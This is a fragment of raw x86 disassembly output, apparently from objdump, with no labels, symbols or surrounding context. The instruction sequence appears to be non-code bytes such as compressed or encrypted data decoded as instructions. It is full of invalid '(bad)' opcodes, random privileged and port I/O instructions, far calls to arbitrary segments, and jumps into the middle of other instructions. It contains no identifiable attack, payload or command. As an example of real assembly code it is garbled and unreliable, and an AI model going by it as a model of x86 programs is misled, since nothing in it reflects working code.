1315ad86:	14 77                	adc    $0x77,%al
1315ad88:	25 1a 10 98 3f       	and    $0x3f98101a,%eax
1315ad8d:	78 c4                	js     0x1315ad53
1315ad8f:	9e                   	sahf
1315ad90:	21 04 55 42 3a 5c 0a 	and    %eax,0xa5c3a42(,%edx,2)
1315ad97:	9e                   	sahf
1315ad98:	a0 27 89 6c 91       	mov    0x916c8927,%al
1315ad9d:	08 02                	or     %al,(%edx)
1315ad9f:	ce                   	into
1315ada0:	d6                   	salc
1315ada1:	92                   	xchg   %eax,%edx
1315ada2:	6f                   	outsl  %ds:(%esi),(%dx)
1315ada3:	20 a0 35 71 19 99    	and    %ah,-0x66e68ecb(%eax)
1315ada9:	3e 43                	ds inc %ebx
1315adab:	db 41 1c             	fildl  0x1c(%ecx)
1315adae:	9a 6d 18 dd ec ba 44 	lcall  $0x44ba,$0xecdd186d
1315adb5:	00 de                	add    %bl,%dh
1315adb7:	10 0c 50             	adc    %cl,(%eax,%edx,2)
1315adba:	22 36                	and    (%esi),%dh
1315adbc:	d2 e9                	shr    %cl,%cl
1315adbe:	07                   	pop    %es
1315adbf:	20 01                	and    %al,(%ecx)
1315adc1:	04 05                	add    $0x5,%al
1315adc3:	63 9f 06 f9 88 20    	arpl   %ebx,0x2088f906(%edi)
1315adc9:	54                   	push   %esp
1315adca:	0d 8b 9c 2b 6a       	or     $0x6a2b9c8b,%eax
1315adcf:	82 6c 11 a4 64       	subb   $0x64,-0x5c(%ecx,%edx,1)
1315add4:	06                   	push   %es
1315add5:	68 60 20 93 3c       	push   $0x3c932060
1315adda:	83 eb b9             	sub    $0xffffffb9,%ebx
1315addd:	60                   	pusha
1315adde:	70 a4                	jo     0x1315ad84
1315ade0:	93                   	xchg   %eax,%ebx
1315ade1:	21 39                	and    %edi,(%ecx)
1315ade3:	c0 60 70 d0          	shlb   $0xd0,0x70(%eax)
1315ade7:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
1315ade8:	7f 06                	jg     0x1315adf0
1315adea:	f1                   	int1
1315adeb:	d1 2b                	shrl   $1,(%ebx)
1315aded:	f8                   	clc
1315adee:	90                   	nop
1315adef:	6a 0a                	push   $0xa
1315adf1:	68 44 61 90 29       	push   $0x29906144
1315adf6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315adf7:	68 1d be e8 2e       	push   $0x2ee8be1d
1315adfc:	f4                   	hlt
1315adfd:	44                   	inc    %esp
1315adfe:	05 16 21 d9 d1       	add    $0xd1d92116,%eax
1315ae03:	ea f1 19 3c f4 46 dd 	ljmp   $0xdd46,$0xf43c19f1
1315ae0a:	07                   	pop    %es
1315ae0b:	b3 cd                	mov    $0xcd,%bl
1315ae0d:	8b d6                	mov    %esi,%edx
1315ae0f:	ac                   	lods   %ds:(%esi),%al
1315ae10:	18 61 49             	sbb    %ah,0x49(%ecx)
1315ae13:	d1 1e                	rcrl   $1,(%esi)
1315ae15:	00 3b                	add    %bh,(%ebx)
1315ae17:	35 f7 25 06 42       	xor    $0x420625f7,%eax
1315ae1c:	d8 00                	fadds  (%eax)
1315ae1e:	4e                   	dec    %esi
1315ae1f:	00 44 09 11          	add    %al,0x11(%ecx,%ecx,1)
1315ae23:	fb                   	sti
1315ae24:	c1 c0 ee             	rol    $0xee,%eax
1315ae27:	00 cb                	add    %cl,%bl
1315ae29:	b9 0c 4e 01 49       	mov    $0x49014e0c,%ecx
1315ae2e:	75 f9                	jne    0x1315ae29
1315ae30:	9a 7f 36 75 83 44 bd 	lcall  $0xbd44,$0x8375367f
1315ae37:	28 fa                	sub    %bh,%dl
1315ae39:	8b 73 01             	mov    0x1(%ebx),%esi
1315ae3c:	8d 9d 00 f8 4e c8    	lea    -0x37b10800(%ebp),%ebx
1315ae42:	06                   	push   %es
1315ae43:	68 0c 8a 2d 66       	push   $0x662d8a0c
1315ae48:	50                   	push   %eax
1315ae49:	d0 01                	rolb   $1,(%ecx)
1315ae4b:	24 06                	and    $0x6,%al
1315ae4d:	0c a1                	or     $0xa1,%al
1315ae4f:	1e                   	push   %ds
1315ae50:	40                   	inc    %eax
1315ae51:	4b                   	dec    %ebx
1315ae52:	4b                   	dec    %ebx
1315ae53:	76 dd                	jbe    0x1315ae32
1315ae55:	b9 40 31 5a 29       	mov    $0x295a3140,%ecx
1315ae5a:	3d f8 5c eb 82       	cmp    $0x82eb5cf8,%eax
1315ae5f:	11 1b                	adc    %ebx,(%ebx)
1315ae61:	4c                   	dec    %esp
1315ae62:	73 1d                	jae    0x1315ae81
1315ae64:	55                   	push   %ebp
1315ae65:	ae                   	scas   %es:(%edi),%al
1315ae66:	46                   	inc    %esi
1315ae67:	b2 ba                	mov    $0xba,%dl
1315ae69:	10 d9                	adc    %bl,%cl
1315ae6b:	07                   	pop    %es
1315ae6c:	f8                   	clc
1315ae6d:	63 ba 28 11 0b 32    	arpl   %edi,0x320b1128(%edx)
1315ae73:	20 44 4c 28          	and    %al,0x28(%esp,%ecx,2)
1315ae77:	78 c1                	js     0x1315ae3a
1315ae79:	17                   	pop    %ss
1315ae7a:	83 98 0c 48 f7 0c b3 	sbbl   $0xffffffb3,0xcf7480c(%eax)
1315ae81:	bb 9b 7a dc d2       	mov    $0xd2dc7a9b,%ebx
1315ae86:	8b 83 10 17 8b 93    	mov    -0x6c74e8f0(%ebx),%eax
1315ae8c:	14 2a                	adc    $0x2a,%al
1315ae8e:	85 b0 90 c1 31 b8    	test   %esi,-0x47ce3e70(%eax)
1315ae94:	6d                   	insl   (%dx),%es:(%edi)
1315ae95:	23 21                	and    (%ecx),%esp
1315ae97:	7a bc                	jp     0x1315ae55
1315ae99:	cc                   	int3
1315ae9a:	50                   	push   %eax
1315ae9b:	4b                   	dec    %ebx
1315ae9c:	80 bb 14 2f e6 56 87 	cmpb   $0x87,0x56e62f14(%ebx)
1315aea3:	56                   	push   %esi
1315aea4:	68 10 be fc f7       	push   $0xf7fcbe10
1315aea9:	96                   	xchg   %eax,%esi
1315aeaa:	01 1f                	add    %ebx,(%edi)
1315aeac:	6d                   	insl   (%dx),%es:(%edi)
1315aead:	06                   	push   %es
1315aeae:	f8                   	clc
1315aeaf:	3a d3                	cmp    %bl,%dl
1315aeb1:	de 2d 3b e0 f7 11    	fisubrs 0x11f7e03b
1315aeb7:	18 ec                	sbb    %ch,%ah
1315aeb9:	f7 fb                	idiv   %ebx
1315aebb:	fc                   	cld
1315aebc:	fc                   	cld
1315aebd:	0b 6c b6 b7          	or     -0x49(%esi,%esi,4),%ebp
1315aec1:	9d                   	popf
1315aec2:	44                   	inc    %esp
1315aec3:	27                   	daa
1315aec4:	b0 8d                	mov    $0x8d,%al
1315aec6:	15 1b f0 ba 58       	adc    $0x58baf01b,%eax
1315aecb:	8c 95 e0 33 00 15    	mov    %ss,0x150033e0(%ebp)
1315aed1:	90                   	nop
1315aed2:	11 15 f4 26 e0 b5    	adc    %edx,0xb5e026f4
1315aed8:	cf                   	iret
1315aed9:	d7                   	xlat   %ds:(%ebx)
1315aeda:	04 10                	add    $0x10,%al
1315aedc:	0a a6 d9 5e eb 8b    	or     -0x7414a127(%esi),%ah
1315aee2:	80 62 40 ea          	andb   $0xea,0x40(%edx)
1315aee6:	6d                   	insl   (%dx),%es:(%edi)
1315aee7:	31 68 d6             	xor    %ebp,-0x2a(%eax)
1315aeea:	5e                   	pop    %esi
1315aeeb:	f7 30                	divl   (%eax)
1315aeed:	27                   	daa
1315aeee:	b3 8c                	mov    $0x8c,%bl
1315aef0:	68 0f b9 83 81       	push   $0x8183b90f
1315aef5:	9c                   	pushf
1315aef6:	4c                   	dec    %esp
1315aef7:	c9                   	leave
1315aef8:	e8 e8 dc 23 43       	call   0x56398be5
1315aefd:	32 32                	xor    (%edx),%dh
1315aeff:	dc e0                	fsub   %st,%st(0)
1315af01:	e0 e4                	loopne 0x1315aee7
1315af03:	16                   	push   %ss
1315af04:	1e                   	push   %ds
1315af05:	c8 25 e4 41          	enter  $0xe425,$0x41
1315af09:	f8                   	clc
1315af0a:	20 18                	and    %bl,(%eax)
1315af0c:	53                   	push   %ebx
1315af0d:	b2 35                	mov    $0x35,%dl
1315af0f:	61                   	popa
1315af10:	4c                   	dec    %esp
1315af11:	38 70 d8             	cmp    %dh,-0x28(%eax)
1315af14:	d8 6c 26 78          	fsubrs 0x78(%esi,%eiz,1)
1315af18:	27                   	daa
1315af19:	d4 3e                	aam    $0x3e
1315af1b:	88 4f d4             	mov    %cl,-0x2c(%edi)
1315af1e:	ec                   	in     (%dx),%al
1315af1f:	02 4e e8             	add    -0x18(%esi),%cl
1315af22:	23 2b                	and    (%ebx),%ebp
1315af24:	09 54 b9 93          	or     %edx,-0x6d(%ecx,%edi,4)
1315af28:	29 f9                	sub    %edi,%ecx
1315af2a:	0c d6                	or     $0xd6,%al
1315af2c:	3c d0                	cmp    $0xd0,%al
1315af2e:	d0 0c 20             	rorb   $1,(%eax,%eiz,1)
1315af31:	cb                   	lret
1315af32:	93                   	xchg   %eax,%ebx
1315af33:	cc                   	int3
1315af34:	43                   	inc    %ebx
1315af35:	68 cc 02 20 27       	push   $0x272002cc
1315af3a:	53                   	push   %ebx
1315af3b:	f2 c8 c8 c4 2c       	repnz enter $0xc4c8,$0x2c
1315af40:	0f 20 cb             	mov    %cr1,%ebx
1315af43:	f0 c4 03             	lock les (%ebx),%eax
1315af46:	75 35                	jne    0x1315af7d
1315af48:	c0 e5 c9             	shl    $0xc9,%ch
1315af4b:	c9                   	leave
1315af4c:	94                   	xchg   %eax,%esp
1315af4d:	c0 bc 42 b4 ed 56 3d 	sarb   $0x90,0x3d56edb4(%edx,%eax,2)
1315af54:	90 
1315af55:	bc eb 5a 37 75       	mov    $0x75375aeb,%esp
1315af5a:	55                   	push   %ebp
1315af5b:	20 30                	and    %dh,(%eax)
1315af5d:	62 8d 93 b8 44 86    	bound  %ecx,-0x79bb476d(%ebp)
1315af63:	0a d8                	or     %al,%bl
1315af65:	e1 f7                	loope  0x1315af5e
1315af67:	90                   	nop
1315af68:	ed                   	in     (%dx),%eax
1315af69:	3b 19                	cmp    (%ecx),%ebx
1315af6b:	b4 ff                	mov    $0xff,%ah
1315af6d:	b5 0a                	mov    $0xa,%ch
1315af6f:	68 74 51 78 2d       	push   $0x2d785174
1315af74:	24 9b                	and    $0x9b,%al
1315af76:	69 b0 1c 11 b6 d7 91 	imul   $0x3208e91,-0x2849eee4(%eax),%esi
1315af7d:	8e 20 03 
1315af80:	2b f4                	sub    %esp,%esi
1315af82:	5c                   	pop    %esp
1315af83:	28 ac 36 e6 c0 ec 33 	sub    %ch,0x33ecc0e6(%esi,%esi,1)
1315af8a:	b9 7c ac 72 8b       	mov    $0x8b72ac7c,%ecx
1315af8f:	12 89 27 1c 23 de    	adc    -0x21dce3d9(%ecx),%cl
1315af95:	ba 88 9d 46 3c       	mov    $0x3c469d88,%edx
1315af9a:	56                   	push   %esi
1315af9b:	25 db 90 ad 3d       	and    $0x3dad90db,%eax
1315afa0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315afa1:	a8 6a                	test   $0x6a,%al
1315afa3:	a8 ed                	test   $0xed,%al
1315afa5:	91                   	xchg   %eax,%ecx
1315afa6:	4c                   	dec    %esp
1315afa7:	c9                   	leave
1315afa8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315afa9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315afaa:	eb 24                	jmp    0x1315afd0
1315afac:	68 35 64 42 9e       	push   $0x9e426435
1315afb1:	a0 94 a0 83 4e       	mov    0x4e83a094,%al
1315afb6:	06                   	push   %es
1315afb7:	8d 5a 6c             	lea    0x6c(%edx),%ebx
1315afba:	e1 99                	loope  0x1315af55
1315afbc:	52                   	push   %edx
1315afbd:	e3 45                	jecxz  0x1315b004
1315afbf:	25 29 0e 50 f9       	and    $0xf9500e29,%eax
1315afc4:	1b cc                	sbb    %esp,%ecx
1315afc6:	46                   	inc    %esi
1315afc7:	ac                   	lods   %ds:(%esi),%al
1315afc8:	e0 8c                	loopne 0x1315af56
1315afca:	08 1c 8f             	or     %bl,(%edi,%ecx,4)
1315afcd:	74 31                	je     0x1315b000
1315afcf:	3d 0e 16 0f d1       	cmp    $0xd10f160e,%eax
1315afd4:	15 29 68 a0 8d       	adc    $0x8da06829,%eax
1315afd9:	52                   	push   %edx
1315afda:	b6 39                	mov    $0x39,%dh
1315afdc:	fe                   	(bad)
1315afdd:	70 50                	jo     0x1315b02f
1315afdf:	c8 eb 17 27          	enter  $0x17eb,$0x27
1315afe3:	0c 01                	or     $0x1,%al
1315afe5:	18 12                	sbb    %dl,(%edx)
1315afe7:	70 1c                	jo     0x1315b005
1315afe9:	90                   	nop
1315afea:	ea 85 1a 96 16 43 8a 	ljmp   $0x8a43,$0x16961a85
1315aff1:	5f                   	pop    %edi
1315aff2:	6c                   	insb   (%dx),%es:(%edi)
1315aff3:	34 cb                	xor    $0xcb,%al
1315aff5:	91                   	xchg   %eax,%ecx
1315aff6:	ba 0f 42 07 71       	mov    $0x7107420f,%edx
1315affb:	8a 18                	mov    (%eax),%bl
1315affd:	bf 52 f3 48 be       	mov    $0xbe48f352,%edi
1315b002:	65 8f                	gs (bad)
1315b004:	9d                   	popf
1315b005:	0f 1f ec             	nop    %esp
1315b008:	cb                   	lret
1315b009:	5a                   	pop    %edx
1315b00a:	92                   	xchg   %eax,%edx
1315b00b:	67 f4                	addr16 hlt
1315b00d:	03 c3                	add    %ebx,%eax
1315b00f:	0c 07                	or     $0x7,%al
1315b011:	9d                   	popf
1315b012:	9c                   	pushf
1315b013:	04 fd                	add    $0xfd,%al
1315b015:	9b                   	fwait
1315b016:	00 57 72             	add    %dl,0x72(%edi)
1315b019:	5f                   	pop    %edi
1315b01a:	8d 2c ef             	lea    (%edi,%ebp,8),%ebp
1315b01d:	43                   	inc    %ebx
1315b01e:	09 07                	or     %eax,(%edi)
1315b020:	7a c2                	jp     0x1315afe4
1315b022:	0d 8b f3 0b fc       	or     $0xfc0bf38b,%eax
1315b027:	4f                   	dec    %edi
1315b028:	35 df 8b 35 45       	xor    $0x45358bdf,%eax
1315b02d:	1f                   	pop    %ds
1315b02e:	69 13 08 2e b3 80    	imul   $0x80b32e08,(%ebx),%edx
1315b034:	75 1d                	jne    0x1315b053
1315b036:	23 78 03             	and    0x3(%eax),%edi
1315b039:	00 1f                	add    %bl,(%edi)
1315b03b:	17                   	pop    %ss
1315b03c:	58                   	pop    %eax
1315b03d:	f7 17                	notl   (%edi)
1315b03f:	a3 78 45 00 6f       	mov    %eax,0x6f004578
1315b044:	00 70 21             	add    %dh,0x21(%eax)
1315b047:	6e                   	outsb  %ds:(%esi),(%dx)
1315b048:	0b c8                	or     %eax,%ecx
1315b04a:	25 07 83 17 d1       	and    $0xd1178307,%eax
1315b04f:	66 74 54             	data16 je 0x1315b0a6
1315b052:	e4 48                	in     $0x48,%al
1315b054:	1e                   	push   %ds
1315b055:	d8 66 74             	fsubs  0x74(%esi)
1315b058:	69 88 bb 60 1b 06 56 	imul   $0xc7c3e056,0x61b60bb(%eax),%ecx
1315b05f:	e0 c3 c7 
1315b062:	d8 5d 9c             	fcomps -0x64(%ebp)
1315b065:	45                   	inc    %ebp
1315b066:	27                   	daa
1315b067:	68 fd ff fc b3       	push   $0xb3fcfffd
1315b06c:	d8 30                	fdivs  (%eax)
1315b06e:	e4 58                	in     $0x58,%al
1315b070:	2c fb                	sub    $0xfb,%al
1315b072:	98                   	cwtl
1315b073:	71 69                	jno    0x1315b0de
1315b075:	4d                   	dec    %ebp
1315b076:	6e                   	outsb  %ds:(%esi),(%dx)
1315b077:	50                   	push   %eax
1315b078:	b9 11 34 fe a7       	mov    $0xa7fe3411,%ecx
1315b07d:	44                   	inc    %esp
1315b07e:	00 46 5e             	add    %al,0x5e(%esi)
1315b081:	72 b2                	jb     0x1315b035
1315b083:	11 78 10             	adc    %edi,0x10(%eax)
1315b086:	68 fd cc 8d 7d       	push   $0x7d8dccfd
1315b08b:	b1 43                	mov    $0x43,%cl
1315b08d:	c7                   	(bad)
1315b08e:	35 32 c7 1b 07       	xor    $0x71bc732,%eax
1315b093:	1c 88                	sbb    $0x88,%al
1315b095:	85 16                	test   %edx,(%esi)
1315b097:	6f                   	outsl  %ds:(%esi),(%dx)
1315b098:	4b                   	dec    %ebx
1315b099:	a8 00                	test   $0x0,%al
1315b09b:	34 e0                	xor    $0xe0,%al
1315b09d:	6d                   	insl   (%dx),%es:(%edi)
1315b09e:	15 27 d6 8a fc       	adc    $0xfc8ad627,%eax
1315b0a3:	39 0e                	cmp    %ecx,(%esi)
1315b0a5:	e4 48                	in     $0x48,%al
1315b0a7:	e0 45                	loopne 0x1315b0ee
1315b0a9:	e4 d0                	in     $0xd0,%al
1315b0ab:	f9                   	stc
1315b0ac:	98                   	cwtl
1315b0ad:	9d                   	popf
1315b0ae:	3c db                	cmp    $0xdb,%al
1315b0b0:	3a b9 f8 6e 56 e8    	cmp    -0x17a99108(%ecx),%bh
1315b0b6:	50                   	push   %eax
1315b0b7:	87 56 92             	xchg   %edx,-0x6e(%esi)
1315b0ba:	98                   	cwtl
1315b0bb:	90                   	nop
1315b0bc:	51                   	push   %ecx
1315b0bd:	57                   	push   %edi
1315b0be:	4d                   	dec    %ebp
1315b0bf:	cc                   	int3
1315b0c0:	21 13                	and    %edx,(%ebx)
1315b0c2:	b3 e6                	mov    $0xe6,%bl
1315b0c4:	9b                   	fwait
1315b0c5:	01 c8                	add    %ecx,%eax
1315b0c7:	33 4d da             	xor    -0x26(%ebp),%ecx
1315b0ca:	73 f7                	jae    0x1315b0c3
1315b0cc:	0a af 95 36 15 9b    	or     -0x64eac96b(%edi),%ch
1315b0d2:	3e 8b 85 7c 39 e8 83 	mov    %ds:-0x7c17c684(%ebp),%eax
1315b0d9:	be 2f ec 54 04       	mov    $0x454ec2f,%esi
1315b0de:	66 d2 95 02 b3 15 0c 	data16 rclb %cl,0xc15b302(%ebp)
1315b0e5:	52                   	push   %edx
1315b0e6:	1f                   	pop    %ds
1315b0e7:	78 a7                	js     0x1315b090
1315b0e9:	5e                   	pop    %esi
1315b0ea:	f6 0e 3b             	testb  $0x3b,(%esi)
1315b0ed:	3c 19                	cmp    $0x19,%al
1315b0ef:	0f 56 f0             	orps   %xmm0,%xmm6
1315b0f2:	7e 76                	jle    0x1315b16a
1315b0f4:	ba 17 99 30 10       	mov    $0x10309917,%edx
1315b0f9:	19 e4                	sbb    %esp,%esp
1315b0fb:	30 67 7b             	xor    %ah,0x7b(%edi)
1315b0fe:	8d 03                	lea    (%ebx),%eax
1315b100:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1315b101:	89 25 53 20 04 eb    	mov    %esp,0xeb042053
1315b107:	06                   	push   %es
1315b108:	ec                   	in     (%dx),%al
1315b109:	41                   	inc    %ecx
1315b10a:	ad                   	lods   %ds:(%esi),%eax
1315b10b:	1e                   	push   %ds
1315b10c:	d4 e1                	aam    $0xe1
1315b10e:	05 ce 82 ee a5       	add    $0xa5ee82ce,%eax
1315b113:	e0 89                	loopne 0x1315b09e
1315b115:	81 b7 b5 b6 17 4e 5b 	xorl   $0xdca8d15b,0x4e17b6b5(%edi)
1315b11c:	d1 a8 dc 
1315b11f:	14 8c                	adc    $0x8c,%al
1315b121:	82 62 c6 03          	andb   $0x3,-0x3a(%edx)
1315b125:	02 c0                	add    %al,%al
1315b127:	47                   	inc    %edi
1315b128:	68 17 08 c7 c1       	push   $0xc1c70817
1315b12d:	e0 03                	loopne 0x1315b132
1315b12f:	cd 25                	int    $0x25
1315b131:	79 86                	jns    0x1315b0b9
1315b133:	84 0d 88 28 e6 de    	test   %cl,0xdee62888
1315b139:	ee                   	out    %al,(%dx)
1315b13a:	8d 67 98             	lea    -0x68(%edi),%esp
1315b13d:	5b                   	pop    %ebx
1315b13e:	38 85 9c 08 6f 09    	cmp    %al,0x96f089c(%ebp)
1315b144:	db 13                	fistl  (%ebx)
1315b146:	0d d9 94 94 d4       	or     $0xd49494d9,%eax
1315b14b:	7b 40                	jnp    0x1315b18d
1315b14d:	11 90 84 8d 4e 61    	adc    %edx,0x614e8d84(%eax)
1315b153:	22 bc 47 c1 81 0c ce 	and    -0x31f37e3f(%edi,%eax,2),%bh
1315b15a:	ea 02 39 f4 d4 e9 88 	ljmp   $0x88e9,$0xd4f43902
1315b161:	ee                   	out    %al,(%dx)
1315b162:	3e 8c 35 17 42 d8 53 	mov    %?,%ds:0x53d84217
1315b169:	85 18                	test   %ebx,(%eax)
1315b16b:	05 80 7d fb c9       	add    $0xc9fb7d80,%eax
1315b170:	36 12 96 b8 28 5d 30 	adc    %ss:0x305d28b8(%esi),%dl
1315b177:	6c                   	insb   (%dx),%es:(%edi)
1315b178:	0e                   	push   %cs
1315b179:	29 b8 6c 14 44 89    	sub    %edi,-0x76bbeb94(%eax)
1315b17f:	26 25 98 5a 76 60    	es and $0x60765a98,%eax
1315b185:	9d                   	popf
1315b186:	99                   	cltd
1315b187:	d1 9e 82 c7 0c 7e    	rcrl   $1,0x7e0cc782(%esi)
1315b18d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315b18e:	8a 08                	mov    (%eax),%cl
1315b190:	c9                   	leave
1315b191:	ae                   	scas   %es:(%edi),%al
1315b192:	1a 48 63             	sbb    0x63(%eax),%cl
1315b195:	33 c9                	xor    %ecx,%ecx
1315b197:	69 19 92 03 32 78    	imul   $0x78320392,(%ecx),%ebx
1315b19d:	d0 69 78             	shrb   $1,0x78(%ecx)
1315b1a0:	1a 2f                	sbb    (%edi),%ch
1315b1a2:	8b 07                	mov    (%edi),%eax
1315b1a4:	51                   	push   %ecx
1315b1a5:	b9 04 7c 51 87       	mov    $0x87517c04,%ecx
1315b1aa:	e4 b0                	in     $0xb0,%al
1315b1ac:	68 96 2f 80 f2       	push   $0xf2802f96
1315b1b1:	2c 51                	sub    $0x51,%al
1315b1b3:	81 5e 18 50 6a 59 ae 	sbbl   $0xae596a50,0x18(%esi)
1315b1ba:	ba 1c 6e ae 9f       	mov    $0x9fae6e1c,%edx
1315b1bf:	01 8b e5 fc 80 bd    	add    %ecx,-0x427f031b(%ebx)
1315b1c5:	0c 6c                	or     $0x6c,%al
1315b1c7:	e5 3e                	in     $0x3e,%eax
1315b1c9:	2e 15 8c 85 03 0a    	cs adc $0xa03858c,%eax
1315b1cf:	3c 0c                	cmp    $0xc,%al
1315b1d1:	db 3d 78 d1 a0 0d    	fstpt  0xda0d178
1315b1d7:	5b                   	pop    %ebx
1315b1d8:	ac                   	lods   %ds:(%esi),%al
1315b1d9:	7e 5b                	jle    0x1315b236
1315b1db:	18 fa                	sbb    %bh,%dl
1315b1dd:	49                   	dec    %ecx
1315b1de:	06                   	push   %es
1315b1df:	79 98                	jns    0x1315b179
1315b1e1:	11 43 68             	adc    %eax,0x68(%ebx)
1315b1e4:	02 b9 41 07 93 f0    	add    -0xf6cf8bf(%ecx),%bh
1315b1ea:	47                   	inc    %edi
1315b1eb:	67 0d 28 fa 24 db    	addr16 or $0xdb24fa28,%eax
1315b1f1:	25 27 28 fa 20       	and    $0x20fa2827,%eax
1315b1f6:	19 24 06             	sbb    %esp,(%esi,%eax,1)
1315b1f9:	ae                   	scas   %es:(%edi),%al
1315b1fa:	0b de                	or     %esi,%ebx
1315b1fc:	95                   	xchg   %eax,%ebp
1315b1fd:	0a 4e 30             	or     0x30(%esi),%cl
1315b200:	8f                   	(bad)
1315b201:	4c                   	dec    %esp
1315b202:	57                   	push   %edi
1315b203:	e2 e4                	loop   0x1315b1e9
1315b205:	76 6c                	jbe    0x1315b273
1315b207:	1f                   	pop    %ds
1315b208:	18 f8                	sbb    %bh,%al
1315b20a:	f8                   	clc
1315b20b:	95                   	xchg   %eax,%ebp
1315b20c:	0a 90 2e 09 bc 1f    	or     0x1fbc092e(%eax),%dl
1315b212:	b8 2c ba 0e c2       	mov    $0xc20eba2c,%eax
1315b217:	3e f8                	ds clc
1315b219:	30 eb                	xor    %ch,%bl
1315b21b:	3f                   	aas
1315b21c:	79 2d                	jns    0x1315b24b
1315b21e:	31 0d 4b 9c b9 5a    	xor    %ecx,0x5ab99c4b
1315b224:	05 e0 d3 b4 fc       	add    $0xfcb4d3e0,%eax
1315b229:	14 ad                	adc    $0xad,%al
1315b22b:	77 42                	ja     0x1315b26f
1315b22d:	9e                   	sahf
1315b22e:	f8                   	clc
1315b22f:	24 83                	and    $0x83,%al
1315b231:	bd 15 a0 3d 48       	mov    $0x483da015,%ebp
1315b236:	c9                   	leave
1315b237:	f6 31                	divb   (%ecx)
1315b239:	ff 75 f8             	push   -0x8(%ebp)
1315b23c:	21 10                	and    %edx,(%eax)
1315b23e:	3e 6c                	ds insb (%dx),%es:(%edi)
1315b240:	09 83 f7 15 68 56    	or     %eax,0x566815f7(%ebx)
1315b246:	43                   	inc    %ebx
1315b247:	2d 08 5e 8b 84       	sub    $0x848b5e08,%eax
1315b24c:	8c 0e                	mov    %cs,(%esi)
1315b24e:	4c                   	dec    %esp
1315b24f:	15 62 93 81 d9       	adc    $0xd9819362,%eax
1315b254:	1b 0c 58             	sbb    (%eax,%ebx,2),%ecx
1315b257:	95                   	xchg   %eax,%ebp
1315b258:	0d e0 d0 17 11       	or     $0x1117d0e0,%eax
1315b25d:	92                   	xchg   %eax,%edx
1315b25e:	aa                   	stos   %al,%es:(%edi)
1315b25f:	11 57 3c             	adc    %edx,0x3c(%edi)
1315b262:	cd 4d                	int    $0x4d
1315b264:	c1 45 f2 48          	roll   $0x48,-0xe(%ebp)
1315b268:	40                   	inc    %eax
1315b269:	84 fc                	test   %bh,%ah
1315b26b:	80 46 26 90          	addb   $0x90,0x26(%esi)
1315b26f:	cd 57                	int    $0x57
1315b271:	00 00                	add    %al,(%eax)
1315b273:	04 bd                	add    $0xbd,%al
1315b275:	0c de                	or     $0xde,%al
1315b277:	40                   	inc    %eax
1315b278:	0d b0 3b 5c 6f       	or     $0x6f5c3bb0,%eax
1315b27d:	65 87 0e             	xchg   %ecx,%gs:(%esi)
1315b280:	85 6c 3c 15          	test   %ebp,0x15(%esp,%edi,1)
1315b284:	92                   	xchg   %eax,%edx
1315b285:	cb                   	lret
1315b286:	60                   	pusha
1315b287:	42                   	inc    %edx
1315b288:	a1 ed fc 59 f0       	mov    0xf059fced,%eax
1315b28d:	a8 59                	test   $0x59,%al
1315b28f:	9a cc 0f 81 10 cc 6e 	lcall  $0x6ecc,$0x10810fcc
1315b296:	95                   	xchg   %eax,%ebp
1315b297:	85 40 72             	test   %eax,0x72(%eax)
1315b29a:	c9                   	leave
1315b29b:	2b 61 06             	sub    0x6(%ecx),%esp
1315b29e:	70 63                	jo     0x1315b303
1315b2a0:	f4                   	hlt
1315b2a1:	f7 01 f2 00 79 f0    	testl  $0xf07900f2,(%ecx)
1315b2a7:	f7 f0                	div    %eax
1315b2a9:	f7 d8                	neg    %eax
1315b2ab:	24 a7                	and    $0xa7,%al
1315b2ad:	84 25 d6 00 e8 e8    	test   %ah,0xe8e800d6
1315b2b3:	2f                   	das
1315b2b4:	21 23                	and    %esp,(%ebx)
1315b2b6:	13 e8                	adc    %eax,%ebp
1315b2b8:	ec                   	in     (%dx),%al
1315b2b9:	0d 32 81 0d 09       	or     $0x90d8132,%eax
1315b2be:	25 e0 3c e0 84       	and    $0x84e03ce0,%eax
1315b2c3:	24 13                	and    $0x13,%al
1315b2c5:	32 e4                	xor    %ah,%ah
1315b2c7:	e4 1b                	in     $0x1b,%al
1315b2c9:	2f                   	das
1315b2ca:	81 6c 2f 74 4e 45 dc 	subl   $0x15dc454e,0x74(%edi,%ebp,1)
1315b2d1:	15 
1315b2d2:	64 6b cd 4e          	fs imul $0x4e,%ebp,%ecx
1315b2d6:	69 41 23 27 d8 24 91 	imul   $0x9124d827,0x23(%ecx),%eax
1315b2dd:	90                   	nop
1315b2de:	09 d8                	or     %ebx,%eax
1315b2e0:	f8                   	clc
1315b2e1:	b0 e4                	mov    $0xe4,%al
1315b2e3:	89 e7                	mov    %esp,%edi
1315b2e5:	23 6e d8             	and    -0x28(%esi),%ebp
1315b2e8:	d8 07                	fadds  (%edi)
1315b2ea:	90                   	nop
1315b2eb:	6c                   	insb   (%dx),%es:(%edi)
1315b2ec:	0f e2 41 b1          	psrad  -0x4f(%ecx),%mm0
1315b2f0:	1a f8                	sbb    %al,%bh
1315b2f2:	cb                   	lret
1315b2f3:	e2 94                	loop   0x1315b289
1315b2f5:	e4 14                	in     $0x14,%al
1315b2f7:	f8                   	clc
1315b2f8:	62 0e                	bound  %ecx,(%esi)
1315b2fa:	64 48                	fs dec %eax
1315b2fc:	e2 54                	loop   0x1315b352
1315b2fe:	7e ee                	jle    0x1315b2ee
1315b300:	a5                   	movsl  %ds:(%esi),%es:(%edi)
1315b301:	e4 0e                	in     $0xe,%al
1315b303:	8c 3a                	mov    %?,(%edx)
1315b305:	00 c7                	add    %al,%bh
1315b307:	0c 38                	or     $0x38,%al
1315b309:	32 b2 b9 5f fe 8d    	xor    -0x7201a047(%edx),%dh
1315b30f:	18 09                	sbb    %cl,(%ecx)
1315b311:	05 14 10 32 32       	add    $0x32321014,%eax
1315b316:	32 32                	xor    (%edx),%dh
1315b318:	0c 24                	or     $0x24,%al
1315b31a:	20 1c 80             	and    %bl,(%eax,%eax,4)
1315b31d:	2f                   	das
1315b31e:	33 32                	xor    (%edx),%esi
1315b320:	28 2c 83             	sub    %ch,(%ebx,%eax,4)
1315b323:	30 43 0e             	xor    %al,0xe(%ebx)
1315b326:	59                   	pop    %ecx
1315b327:	49                   	dec    %ecx
1315b328:	04 7f                	add    $0x7f,%al
1315b32a:	3e 70 66             	jo,pt  0x1315b393
1315b32d:	73 27                	jae    0x1315b356
